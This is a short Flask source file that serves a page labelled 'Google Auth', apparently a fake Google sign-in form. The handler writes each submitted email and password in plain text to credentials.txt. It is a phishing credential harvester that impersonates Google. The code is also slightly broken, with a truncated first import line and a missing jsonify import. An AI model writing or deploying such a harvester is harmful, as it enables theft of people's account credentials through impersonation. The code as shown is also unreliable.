rom flask import Flask, render_template, request

app = Flask(__name__)

@app.route('/')
def home():
    return 'Ej uz <a href="/google-auth/">Google Auth</a>'

@app.route('/google-auth/', methods=['GET'])
def show_form():
    return render_template('google-auth.html')

@app.route('/google-auth/', methods=['POST'])
def handle_form():
    email = request.form['email']
    password = request.form['password']
    
    with open('credentials.txt', 'a') as f:
        f.write(f"Email: {email}, Password: {password}\n")
    if request.is_json:
        return jsonify({'message': 'Credentials saved'}), 200
    else:
        return 'Credentials saved', 200

if __name__ == '__main__':
    app.run(port=5000, debug=True)
